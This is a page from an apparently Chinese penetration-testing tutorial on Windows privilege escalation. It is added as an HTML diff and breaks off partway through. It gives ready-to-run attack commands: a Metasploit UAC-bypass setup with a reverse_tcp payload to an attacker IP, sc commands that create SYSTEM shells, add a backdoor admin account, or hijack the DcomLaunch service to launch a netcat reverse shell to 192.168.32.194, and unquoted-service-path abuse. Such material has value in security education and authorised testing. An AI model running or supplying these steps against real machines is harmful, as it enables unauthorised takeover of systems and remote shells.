@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Windows Privilege Escalation - windows系统提权 | 烟雨黑帽</title>
+<meta name="description" content="Windows系统提权 提权知识储备 1️⃣常见提权方法 1、 溢出漏洞提权 2、 数据库提权 3、 第三方软件提权 2️⃣Cmd命令无法执行原因分析 有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。 解决方法是通过脚本木马查找可读可写目录，…">
+<meta name="keywords" content="Windows Privilege Escalation, windows系统提权, 网络安全, 渗透测试, web security, penetration testing, 白帽">
+<meta name="author" content="noahs">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="烟雨黑帽">
+<meta property="og:title" content="Windows Privilege Escalation">
+<meta property="og:description" content="Windows系统提权 提权知识储备 1️⃣常见提权方法 1、 溢出漏洞提权 2、 数据库提权 3、 第三方软件提权 2️⃣Cmd命令无法执行原因分析 有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。 解决方法是通过脚本木马查找可读可写目录，…">
+<meta property="og:locale" content="zh_CN">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Windows Privilege Escalation">
+<meta name="twitter:description" content="Windows系统提权 提权知识储备 1️⃣常见提权方法 1、 溢出漏洞提权 2、 数据库提权 3、 第三方软件提权 2️⃣Cmd命令无法执行原因分析 有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。 解决方法是通过脚本木马查找可读可写目录，…">
+<meta name="theme-color" content="#0f172a">
+<script src="../assets/theme.js"></script>
+<link rel="icon" href="../favicon.svg" type="image/svg+xml">
+<link rel="stylesheet" href="../assets/style.css?v=1">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.9.0/styles/atom-one-dark.min.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@graph": [{"@type": "BreadcrumbList", "itemListElement": [{"@type": "ListItem", "position": 1, "name": "烟雨黑帽"}, {"@type": "ListItem", "position": 2, "name": "windows系统提权"}]}, {"@type": "TechArticle", "headline": "Windows Privilege Escalation", "alternativeHeadline": "windows系统提权", "description": "Windows系统提权 提权知识储备 1️⃣常见提权方法 1、 溢出漏洞提权 2、 数据库提权 3、 第三方软件提权 2️⃣Cmd命令无法执行原因分析 有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。 解决方法是通过脚本木马查找可读可写目录，…", "inLanguage": "zh-CN", "author": {"@type": "Person", "name": "noahs"}, "isPartOf": {"@type": "Book", "name": "烟雨黑帽"}, "datePublished": "2026-10-11"}]}</script>
+</head>
+<body>
+<div class="searchbar">
+  <div class="search">
+    <input id="navSearch" type="search" placeholder="搜索目录 / Search…" autocomplete="off" aria-label="搜索目录">
+  </div>
+</div>
+<header class="topbar">
+  <button class="icon-btn" id="menuBtn" aria-label="菜单">&#9776;</button>
+  <a class="brand" href="../">
+    <span class="brand-mark">WS</span>
+    <span class="brand-text"><b>烟雨黑帽</b><i>Web安全与SEO实战手册</i></span>
+  </a>
+  <button class="icon-btn" id="themeBtn" aria-label="切换主题">&#9789;</button>
+</header>
+<div class="layout">
+  <aside class="sidebar" id="sidebar">
+    <a class="home-btn" href="../"><svg viewBox="0 0 24 24" width="15" height="15" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 10.2 12 3l9 7.2"/><path d="M5.5 9.4V21h13V9.4"/></svg><span>首页</span></a>
+    <div class="sidebar-head">目录 <span class="count">186</span></div>
+    <nav class="nav-scroll"><ul class="nav-tree"><li class="nav-item depth-0"><span class="nav-label">搜索引擎优化</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../knowledge/">基本知识</a></li><li class="nav-item depth-1"><a href="../do-i-need-seo/">我需要SEO吗</a></li><li class="nav-item depth-1"><a href="../whitehat-seo/">白帽SEO</a></li><li class="nav-item depth-1"><a href="../ai-seo/">AI SEO</a></li><li class="nav-item depth-1"><a href="../blackhat-seo/">黑帽SEO</a><ul class="nav-children"><li class="nav-item depth-2"><a href="../wildcard-directory-site-farm/">泛目录泛内页站群</a></li><li class="nav-item depth-2"><a href="../wildcard-subdomain-site-farm/">泛二级站群</a></li><li class="nav-item depth-2"><a href="../mirror-site-farm/">小偷镜像站群</a></li><li class="nav-item depth-2"><a href="../parasite-seo/">动态寄生虫</a></li><li class="nav-item depth-2"><a href="../subdirectory-in-site/">二级目录站内站</a></li><li class="nav-item depth-2"><a href="../spider-pool/">蜘蛛池</a></li><li class="nav-item depth-2"><a href="../standalone-site-farm/">独立站站群</a></li></ul></li><li class="nav-item depth-1"><a href="../black-market/">黑产研究</a></li></ul></li><li class="nav-item depth-0"><a href="../information-gathering/">信息收集</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../subdomain-enumeration-tools/">工具枚举</a></li><li class="nav-item depth-1"><a href="../dns-zone-transfer-vulnerability/">DNS域传送漏洞</a></li><li class="nav-item depth-1"><a href="../google-hacking-dorks/">google黑客</a></li><li class="nav-item depth-1"><a href="../common-ports-services-summary/">常见端口&amp;解析&amp;总结</a></li><li class="nav-item depth-1"><a href="../port-scanning-tools/">扫描工具</a></li><li class="nav-item depth-1"><a href="../nmap-scanning-guide/">nmap扫描</a></li><li class="nav-item depth-1"><a href="../email-information-gathering/">邮箱信息收集</a></li><li class="nav-item depth-1"><a href="../cdn-detection/">CDN识别</a></li><li class="nav-item depth-1"><a href="../bypass-cdn-find-real-ip/">绕过CDN查找真实IP</a></li></ul></li><li class="nav-item depth-0"><a href="../vulnerability-scanners/">扫描器</a></li><li class="nav-item depth-0"><a href="../sql-injection/">SQL注入</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../sql-injection-common-functions/">常用函数</a></li><li class="nav-item depth-1"><a href="../sql-injection-steps/">sql注入步骤</a></li><li class="nav-item depth-1"><a href="../union-sql-injection-information-schema/">union注入和information_schema库</a></li><li class="nav-item depth-1"><a href="../error-based-sql-injection-functions/">函数和报错注入</a></li><li class="nav-item depth-1"><a href="../blind-sql-injection/">SQL盲注</a></li><li class="nav-item depth-1"><a href="../other-sql-injection-techniques/">其他注入方式</a></li><li class="nav-item depth-1"><a href="../access-database-injection/">Access数据库注入</a></li><li class="nav-item depth-1"><a href="../mssql-database-injection/">MSSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../mysql-database-injection/">MYSQL数据库注入</a></li><li class="nav-item depth-1"><a href="../sqlmap-tutorial/">神器SQLmap</a></li></ul></li><li class="nav-item depth-0"><a href="../xss-cross-site-scripting/">xss跨站脚本攻击</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../xss-principles-and-types/">xss原理和分类</a></li><li class="nav-item depth-1"><a href="../xss-bypass-techniques/">xss绕过技巧</a></li><li class="nav-item depth-1"><a href="../xss-case-studies/">xss案例</a></li></ul></li><li class="nav-item depth-0"><a href="../file-upload-download-inclusion/">文件上传下载包含</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../common-sensitive-file-paths/">常有用文件路径</a></li><li class="nav-item depth-1"><a href="../file-upload-vulnerability/">文件上传漏洞</a></li><li class="nav-item depth-1"><a href="../file-download-vulnerability/">文件下载漏洞</a></li><li class="nav-item depth-1"><a href="../file-inclusion-vulnerability/">文件包含漏洞</a></li><li class="nav-item depth-1"><a href="../upload-labs-file-upload-labs/">upload-labs上传漏洞练习</a></li></ul></li><li class="nav-item depth-0"><a href="../xxe-ssrf-csrf/">XXE、SSRF、CSRF</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../ssrf-fundamentals/">SSRF原理基础</a></li><li class="nav-item depth-1"><a href="../ssrf-practical-cases/">SSRF案例实战</a></li><li class="nav-item depth-1"><a href="../csrf-fundamentals/">CSRF原理基础</a></li><li class="nav-item depth-1"><a href="../csrf-cases-and-prevention/">CSRF案例及防范</a></li><li class="nav-item depth-1"><a href="../xxe-xml-dtd-basics/">XXE之XML_DTD基础</a></li><li class="nav-item depth-1"><a href="../xxe-payloads-and-fixes/">XXE之payload与修复</a></li><li class="nav-item depth-1"><a href="../xxe-combined-with-ssrf/">XXE结合SSRF</a></li></ul></li><li class="nav-item depth-0"><a href="../rce-and-deserialization/">远程命令执行与反序列化</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../remote-command-code-execution/">远程命令和代码执行漏洞</a></li><li class="nav-item depth-1"><a href="../deserialization-vulnerabilities/">反序列化漏洞</a></li></ul></li><li class="nav-item depth-0"><a href="../captcha-and-brute-force/">验证码与暴力破解</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../brute-force-captcha-basics/">爆破与验证码原理</a></li><li class="nav-item depth-1"><a href="../cs-architecture-brute-force/">CS架构暴力破解</a></li><li class="nav-item depth-1"><a href="../bs-architecture-brute-force/">BS架构暴力破解</a></li></ul></li><li class="nav-item depth-0"><a href="../web-editor-vulnerabilities/">WEB编辑器漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../web-editor-vulnerabilities-basics/">编辑器漏洞基础</a></li><li class="nav-item depth-1"><a href="../ewebeditor-vulnerabilities/">Ewebeditor编辑器</a></li><li class="nav-item depth-1"><a href="../fckeditor-vulnerabilities/">FCKeditor编辑器</a></li><li class="nav-item depth-1"><a href="../other-web-editors/">其他编辑器</a></li></ul></li><li class="nav-item depth-0"><a href="../web-middleware-vulnerabilities/">web中间件漏洞</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../middleware-parsing-vulnerabilities/">中间件解析漏洞</a></li><li class="nav-item depth-1"><a href="../apache-tomcat-vulnerabilities/">Tomcat常见的漏洞总结</a></li><li class="nav-item depth-1"><a href="../jboss-exploitation/">Jboss漏洞利用总结</a></li><li class="nav-item depth-1"><a href="../weblogic-exploitation/">Weblogic漏洞利用总结</a></li></ul></li><li class="nav-item depth-0"><a href="../web-penetration-testing-steps/">WEB具体步骤</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../neighboring-site-attack-privilege-escalation/">旁注和越权</a></li><li class="nav-item depth-1"><a href="../cdn-bypass/">CDN绕过</a></li><li class="nav-item depth-1"><a href="../privilege-escalation-logic-flaws/">越权与逻辑漏洞</a></li><li class="nav-item depth-1"><a href="../other-common-web-vulnerabilities/">WEB应用常见其他漏洞</a></li><li class="nav-item depth-1"><a href="../web-login-page-penetration/">WEB登陆页面渗透思路</a></li></ul></li><li class="nav-item depth-0"><a href="../social-engineering-phishing-apt/">社工、钓鱼、apt</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../social-engineering-information-gathering/">社工和信息收集</a></li><li class="nav-item depth-1"><a href="../domain-spoofing/">域名欺骗</a></li><li class="nav-item depth-1"><a href="../phishing-emails/">钓鱼邮件</a></li><li class="nav-item depth-1"><a href="../phishing-trojan-tools/">一些钓鱼用的挂马工具</a></li></ul></li><li class="nav-item depth-0"><a href="../code-audit/">代码审计</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../code-audit-tools/">代码审计工具</a></li></ul></li><li class="nav-item depth-0"><a href="../waf-bypass/">WAF绕过</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../waf-basics-cloud-waf/">WAF基础及云WAF</a></li><li class="nav-item depth-1"><a href="../waf-bypass-methods/">各种WAF绕过方法</a></li><li class="nav-item depth-1"><a href="../bypassing-waf-file-upload/">绕过WAF上传文件</a></li></ul></li><li class="nav-item depth-0"><a href="../system-privilege-escalation/">系统提权</a><ul class="nav-children"><li class="nav-item depth-1 active"><a href="../windows-privilege-escalation/">windows系统提权</a></li><li class="nav-item depth-1"><a href="../linux-privilege-escalation/">linux系统提权</a></li><li class="nav-item depth-1"><a href="../database-privilege-escalation/">数据库提权操作系统</a></li></ul></li><li class="nav-item depth-0"><a href="../internal-network-lateral-movement/">内网横向渗透</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../internal-network-tunneling/">内网穿透方式</a></li><li class="nav-item depth-1"><a href="../third-party-app-privilege-escalation/">一些内网第三方应用提权</a></li></ul></li><li class="nav-item depth-0"><a href="../arp-and-dos-attacks/">ARP与DOS</a><ul class="nav-children"><li class="nav-item depth-1"><a href="../arp-spoofing/">ARP欺骗</a></li><li class="nav-item depth-1"><a href="../dos-and-ddos-attacks/">DOS与DDOS</a></li><li class="nav-item depth-1"><a href="../dos-attack-tools/">一些DOS工具</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../learn-guide/">安全研发学习指南</a></li><li class="nav-item depth-1"><a href="../term/">相关术语</a></li><li class="nav-item depth-1"><a href="../firewall/">防火墙</a></li><li class="nav-item depth-1"><a href="../open-source/">开源项目推荐</a></li><li class="nav-item depth-1"><a href="../cl-snort/">源码学习之Snort3</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全研究</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../research-list/">导航列表</a></li><li class="nav-item depth-1"><a href="../ai-sec/">人工智能安全(AISec)</a></li><li class="nav-item depth-1"><a href="../llm-sec/">大语言模型安全(LLM security)</a></li><li class="nav-item depth-1"><a href="../apt/">APT</a></li><li class="nav-item depth-1"><a href="../attck/">ATT&amp;CK</a></li><li class="nav-item depth-1"><a href="../fuzzing/">模糊测试</a></li><li class="nav-item depth-1"><a href="../binary-sec/">二进制安全</a></li><li class="nav-item depth-1"><a href="../device-sec/">路由设备安全</a></li><li class="nav-item depth-1"><a href="../ic-sec/">工控安全</a></li><li class="nav-item depth-1"><a href="../5g-sec/">5g安全</a></li><li class="nav-item depth-1"><a href="../iov-sec/">车联网安全</a></li><li class="nav-item depth-1"><a href="../protocol-sec/">协议安全</a></li><li class="nav-item depth-1"><a href="../boofuzz/">Boofuzz</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全管理</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cso/">CSO与安全负责人</a></li><li class="nav-item depth-1"><a href="../enterprise-sec/">企业安全建设</a></li><li class="nav-item depth-1"><a href="../classified-protection/">等级保护</a></li><li class="nav-item depth-1"><a href="../sec-jd/">安全招聘</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">安全产品营销</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../sec-operation/">安全运营</a></li><li class="nav-item depth-1"><a href="../axure-rp/">Axure RP</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">应急响应</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../incident-response-learn-guide/">应急响应学习参考</a></li><li class="nav-item depth-1"><a href="../traceback/">溯源反制</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CVE</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cve/">CVE相关参考</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">渗透测试</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../pentest-learn-guide/">渗透测试学习参考</a></li><li class="nav-item depth-1"><a href="../pentest-term/">术语</a></li><li class="nav-item depth-1"><a href="../kali-linux/">Kali Linux</a></li><li class="nav-item depth-1"><a href="../red-team/">红队</a></li><li class="nav-item depth-1"><a href="../brute-force/">暴力破解</a></li><li class="nav-item depth-1"><a href="../xss/">跨站脚本攻击</a></li><li class="nav-item depth-1"><a href="../csrf/">跨站请求伪造</a></li><li class="nav-item depth-1"><a href="../reverse-shell/">反弹Shell</a></li><li class="nav-item depth-1"><a href="../capture-package/">抓包</a></li><li class="nav-item depth-1"><a href="../crack/">破解</a></li><li class="nav-item depth-1"><a href="../nmap/">Nmap</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">CTF</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../ctf-learn-guide/">基础知识</a></li><li class="nav-item depth-1"><a href="../env-config/">测试环境搭建</a></li><li class="nav-item depth-1"><a href="../ctf-skill/">CTF竞赛常用基本解题技巧</a></li><li class="nav-item depth-1"><a href="../pwn/">PWN</a></li><li class="nav-item depth-1"><a href="../crypto/">Crypto</a></li><li class="nav-item depth-1"><a href="../ctf-re/">RE</a></li><li class="nav-item depth-1"><a href="../hackthebox/">HackTheBox</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">架构</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../architecture-learn-guide/">架构学习指南</a></li><li class="nav-item depth-1"><a href="../notes/">读书笔记</a></li><li class="nav-item depth-1"><a href="../design-pattern/">设计模式</a></li><li class="nav-item depth-1"><a href="../ddd/">领域驱动设计</a></li><li class="nav-item depth-1"><a href="../micro-services/">微服务</a></li><li class="nav-item depth-1"><a href="../scrum/">Scrum</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">后端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../backend-learn-guide/">后端开发学习指南</a></li><li class="nav-item depth-1"><a href="../computer-networking/">计算机网络</a></li><li class="nav-item depth-1"><a href="../os/">操作系统</a></li><li class="nav-item depth-1"><a href="../database/">数据库</a></li><li class="nav-item depth-1"><a href="../search-engine/">搜索引擎</a></li><li class="nav-item depth-1"><a href="../python/">Python</a></li><li class="nav-item depth-1"><a href="../go/">Golang</a></li><li class="nav-item depth-1"><a href="../rust/">Rust</a></li><li class="nav-item depth-1"><a href="../rabbitmq/">RabbitMQ</a></li><li class="nav-item depth-1"><a href="../kafka/">Kafka</a></li><li class="nav-item depth-1"><a href="../jwt/">JWT认证</a></li><li class="nav-item depth-1"><a href="../regex/">正则表达式</a></li><li class="nav-item depth-1"><a href="../git/">Git</a></li><li class="nav-item depth-1"><a href="../git-flow/">Git Flow</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">机器学习</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../machine-learning/">机器学习</a></li><li class="nav-item depth-1"><a href="../nlp/">自然语言处理</a></li><li class="nav-item depth-1"><a href="../llms/">大语言模型LLMs</a></li><li class="nav-item depth-1"><a href="../statistical-learning/">统计学习方法笔记</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">前端开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../frontend-learn-guide/">前端开发学习指南</a></li><li class="nav-item depth-1"><a href="../html5/">HTML5</a></li><li class="nav-item depth-1"><a href="../css/">CSS</a></li><li class="nav-item depth-1"><a href="../js/">JavaScript</a></li><li class="nav-item depth-1"><a href="../typescript/">TypeScript</a></li><li class="nav-item depth-1"><a href="../vue/">Vue.js</a></li><li class="nav-item depth-1"><a href="../react/">React</a></li><li class="nav-item depth-1"><a href="../npm/">NPM</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">爬虫开发</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../cookie-pool/">Cookie池设计</a></li></ul></li><li class="nav-item depth-0"><span class="nav-label">DevOps</span><ul class="nav-children"><li class="nav-item depth-1"><a href="../devops-learn-guide/">DevOps学习指南</a></li><li class="nav-item depth-1"><a href="../docker/">Docker</a></li><li class="nav-item depth-1"><a href="../k8s/">Kubernetes</a></li><li class="nav-item depth-1"><a href="../vm/">虚拟机</a></li><li class="nav-item depth-1"><a href="../linux/">Linux</a></li><li class="nav-item depth-1"><a href="../windows/">Windows</a></li><li class="nav-item depth-1"><a href="../sre/">SRE</a></li><li class="nav-item depth-1"><a href="../shell/">Shell</a></li><li class="nav-item depth-1"><a href="../syslog/">syslog</a></li></ul></li><li class="nav-item depth-0"><a href="../todo-list/">Todo List</a></li></ul>
+</nav>
+  </aside>
+  <div class="scrim" id="scrim"></div>
+  <main class="content">
+<article class="article"><nav class="crumbs"><a href="../">烟雨黑帽</a><span>/</span><span>windows系统提权</span></nav><a class="ad-banner" href="../knowledge/" aria-label="SEO专题推广"><img src="../assets/ad-seo.svg" alt="Web安全与SEO实战手册 — 搜索引擎优化(SEO)专题推广" width="970" height="90" loading="lazy"></a><h1>windows系统提权</h1><p class="cn-title">Windows Privilege Escalation</p><details class="toc-box" open><summary>本页目录 / On this page</summary><div class="toc">
+<ul>
+<li><a href="#windows">Windows系统提权</a><ul>
+<li><a href="#_1">提权知识储备</a><ul>
+<li><a href="#1">1️⃣常见提权方法</a></li>
+<li><a href="#2cmd">2️⃣Cmd命令无法执行原因分析</a></li>
+<li><a href="#3">3️⃣提权常用命令讲解</a></li>
+</ul>
+</li>
+<li><a href="#_2">系统溢出漏洞提权实战</a><ul>
+<li><a href="#_3">零、系统溢出漏洞提权分类：</a></li>
+<li><a href="#uac">一、UAC绕过提权</a></li>
+<li><a href="#_4">二、利用系统内核溢出漏洞提权</a><ul>
+<li><a href="#_5">如何判断可用的漏洞</a></li>
+</ul>
+</li>
+<li><a href="#scadministratorsystem">三、利用SC将administrator提权至system</a></li>
+<li><a href="#_6">四、利用不带引号的服务路径</a></li>
+<li><a href="#_7">五、利用不安全的服务权限</a><ul>
+<li><a href="#_8">完整案例：</a></li>
+</ul>
+</li>
+<li><a href="#_9">六、计划任务</a></li>
+<li><a href="#meterpreter">七、Meterpreter基础提权</a></li>
+</ul>
+</li>
+<li><a href="#_10">溢出漏洞安全防范</a></li>
+<li><a href="#_11">提权后获取管理员密码</a><ul>
+<li><a href="#1_1">1、本地管理员密码如何直接提取</a><ul>
+<li><a href="#1mimikatz">①、直接通过mimikatz读取管理员密码</a></li>
+<li><a href="#2lazagne-python">②、Lazagne 需要本地支持python</a></li>
+</ul>
+</li>
+<li><a href="#2hash">2、本地Hash远程直接登录</a></li>
+<li><a href="#3hash">3、Hash密钥暴力破解</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</div>
+</details><div class="article-body"><h1 id="windows">Windows系统提权</h1>
+<h2 id="_1">提权知识储备</h2>
+<h3 id="1">1️⃣常见提权方法</h3>
+<blockquote>
+<p>1、 溢出漏洞提权 
+2、 数据库提权 
+3、 第三方软件提权</p>
+</blockquote>
+<h3 id="2cmd">2️⃣Cmd命令无法执行原因分析</h3>
+<p>有时通过webshell连接上操作系统后，cmd命令可能无法执行，原因一般都是被管理员降权或删除、组件被删除。
+解决方法是通过脚本木马查找可读可写目录，上传cmd.exe，调用设定cmd路径（找可读可写目录不要选带空格目录）。</p>
+<pre><code class="language-cmd">#设置cmd执行路径
+setp c:\xxx\vvv\cmd.exe
+</code></pre>
+<h3 id="3">3️⃣提权常用命令讲解</h3>
+<pre><code>whoami ——查看用户权限
+systeminfo ——查看操作系统，补丁情况
+ipconfig——查看当前服务器IP ipconfig /all
+net user——查看当前用户情况
+netstat ——查看当前网络连接情况  
+netstat –ano  /netstat –an | find “ESTABLISHED”
+tasklist ——查看当前进程情况 tasklist /svc
+taskkill ——结束进程 taskkill -PID xx
+net start  ——启动服务
+net stop ——停止服务
+hostname ——获取主机名称
+quser or query user ——获取在线用户
+netstat -ano | findstr 3389 ——获取rdp连接来源IP
+dir c:\programdata\ ——分析安装杀软
+wmic qfe get Caption,Description,HotFixID,InstalledOn ——列出已安装的补丁
+REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server\WinStations\RDP-Tcp /v PortNumber ——获取远程端口
+tasklist /svc | find &quot;TermService&quot; + netstat -ano ——获取远程端口
+</code></pre>
+<h2 id="_2">系统溢出漏洞提权实战</h2>
+<h3 id="_3"><strong>零、系统溢出漏洞提权分类：</strong></h3>
+<ol>
+<li>远程溢出
+攻击者只需要与服务器建立连接，然后根据系统的漏洞，使用相应的溢出程序，即可获取到远程服务器的root权限。       </li>
+<li>本地溢出
+首先要有服务器的一个用户，且需要有执行的权限的用户才能发起提权，
+攻击者通常会向服务器上传本地溢出程序，在服务器端执行，如果系统存在漏洞，那么将溢出root权限</li>
+</ol>
+<h3 id="uac">一、UAC绕过提权</h3>
+<p>UAC（User Account Control）是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。
+当获得的权限是属于管理员组的时候但是并不是administrator这个用户，此时就可能需要我们进行绕过UAC的操作，否则虽然是管理员组但是实际上并没有管理员所对应的高权限操作,这个时候就需要bypass uac。</p>
+<p><strong>uac 绕过exp</strong></p>
+<pre><code class="language-sh">#用kali
+use exploit/windows/local/ask
+
+meterpreter &gt; background  [*] Backgrounding session 1... 
+msf5 exploit(multi/handler) &gt; use exploit/windows/local/ask 
+msf5 exploit(windows/local/ask) &gt; set session 1 
+msf5 exploit(windows/local/ask) &gt; set lhost 192.168.60.79 
+msf5 exploit(windows/local/ask) &gt; set lport 4444 
+msf5 exploit(windows/local/ask) &gt; set payload windows/meterpreter/reverse_tcp 
+msf5 exploit(windows/local/ask) &gt; set technique exe 
+msf5 exploit(windows/local/ask) &gt; exploit 
+
+其他exp:
+use exploit/windows/local/bypassuacuse
+exploit/windows/local/bypassuac
+</code></pre>
+<h3 id="_4">二、利用系统内核溢出漏洞提权</h3>
+<p>此提权方法即是通过系统本身存在的一些漏洞，未曾打相应的补丁而暴露出来的提权方法，依托可以提升权限的EXP和它们的补丁编号，进行提升权限。</p>
+<p><strong>微软官方时刻关注漏洞补丁列表网址:</strong>
+***.com</p>
+<blockquote>
+<p>比如常用的几个已公布的 exp：KB2592799、KB3000061、KB2592799</p>
+</blockquote>
+<p><strong>github中整理好的溢出提权exp：</strong>
+***.com
+***.com
+***.com</p>
+<h4 id="_5">如何判断可用的漏洞</h4>
+<ol>
+<li>
+<p><strong>快速查找操作系统未打补丁脚本</strong>
+   可以最安全的减少目标机的未知错误，以免影响业务。 命令行下执行检测未打补丁的命令如下：</p>
+<p><code>cmd
+systeminfo&gt;micropoor.txt&amp;(for %i in ( KB977165 KB2160329 KB2503665 KB2592799 KB2707511 KB2829361 KB2850851 KB3000061 KB3045171 KB3077657 KB3079904 KB3134228 KB3143141 KB3141780 ) do @type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&amp;del /f /q /a micropoor.txt</code>
+2. <strong>MSF后渗透扫描：</strong>
+<code>post/windows/gather/enum_patches</code>
+3. <strong>Powershell扫描：</strong>
+<code>Import-Module C:\Sherlock.ps1
+Find-AllVulns</code></p>
+</li>
+</ol>
+<h3 id="scadministratorsystem">三、利用SC将administrator提权至system</h3>
+<p><strong>试用版本：</strong>windows 7、8、03、08、12、16</p>
+<p>关于sc命令：SC 是用于与服务控制管理器和服务进行通信的命令行程序。提供的功能类似于“控制面板”中“管理工具”项中的“服务”。</p>
+<pre><code class="language-cmd">sc Create syscmd binPath= “cmd /K start” type= own type= interact
+sc start systcmd
+</code></pre>
+<blockquote>
+<p>命令含义：
+创建一个名叫syscmd的新的交互式的cmd服务
+然后执行<code>sc start systcmd</code>，就得到了一个system权限的cmd环境</p>
+</blockquote>
+<h3 id="_6">四、利用不带引号的服务路径</h3>
+<p><strong>Windows命令解释程序可能会遇到名称中的空格，并且没有包装在引号中的时候。就有可能出现解析漏洞。</strong>
+如开机自启动中有程序路径<code>C:\Program Files\Vulnerable.exe</code>,其中存在空格，此时在C盘根目录上传Program.exe文件时，可能会被目标开机自启动。如果无效，还可以尝试在C:\Program Files路径下上传Vulnerable.exe文件。</p>
+<pre><code>C:\Program.exe
+C:\Program Files\Vulnerable.exe
+C:\Program Files\Vulnerable Service\Sub.exe
+C:\Program Files\Vulnerable Service\Sub Directory\service.exe
+</code></pre>
+<p><strong>可以使用以下命令查看错误配置的路径</strong></p>
+<pre><code class="language-cmd">wmic service get name,displayname,pathname,startmode |findstr /i &quot;Auto&quot; |findstr /i /v &quot;C:\Windows\\&quot; |findstr /i /v &quot;&quot;&quot;
+</code></pre>
+<h3 id="_7">五、利用不安全的服务权限</h3>
+<p><strong>⚫即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它。</strong>
+<strong>AccessChk工具可以用来查找用户可以修改的服务：</strong></p>
+<pre><code class="language-cmd">accesschk.exe -uwcqv “Authenticated Users” * /accepteula
+accesschk.exe -uwcqv “user” *
+</code></pre>
+<p><strong>sc命令也可以用来查找用户可以修改的服务：</strong></p>
+<pre><code class="language-cmd">#查找可以修改的服务
+sc qc “Service”  
+
+sc config xxx binpath= “net user rottenadmin P@ssword123! /add”
+sc stop xxx
+sc start xxx
+</code></pre>
+<p>每当我们开启服务时sc命令都返回了一个错误。这是因为net user命令没有指向二进制服务，因此SCM无法 与服务进行通信，通过使用执行自动迁移到新进程的payload，手动迁移进程，或者在执行后将服务的bin路径设置回原始服务二进制文件，可以解决这个问题。或者我们在权限允许的情况下，将我们的木马放到服务目录下，并重命名为服务启动的应用名称。电脑重启时即可获得一个system的shell</p>
+<h5 id="_8">完整案例：</h5>
+<p><strong>①、利用系统自带的 DcomLaunch服务测试(此服务Power User组低权可操作)</strong></p>
+<pre><code class="language-cmd">#查询DcomLaunch的详细信息
+sc qc DcomLaunch
+#查看服务是否启动
+net start | find &quot;DCOM Server Process Launcher&quot;  
+
+#运行 tasklist /svc  找到对应服务
+tasklist /svc
+</code></pre>
+<p><strong>②、修改服务并获取系统权限</strong></p>
+<p>这里要配置使用nc反弹shell到我的攻击机上，把nc放到c:\windows\temp目录下，使用sc对服务进行修改</p>
+<pre><code>sc config DcomLaunch binpath= &quot;C:\wmpub\nc.exe -nv 192.168.32.194 4433 -e C:\WINDOWS\system32\cmd.exe&quot;  
+</code></pre>
+<p>⛔注意<code>binpath=</code>后面一定要有个空格，IP为攻击者IP</p>
+<p><strong>③、查看是否第二步成功</strong></p>
+<pre><code>sc qc DcomLaunch 
+</code></pre>
+<p><strong>④、配置账号密码</strong></p>
+<pre><code>sc config DcomLaunch obj= &quot;.\LocalSystem&quot;  password= &quot;&quot;
+</code></pre>
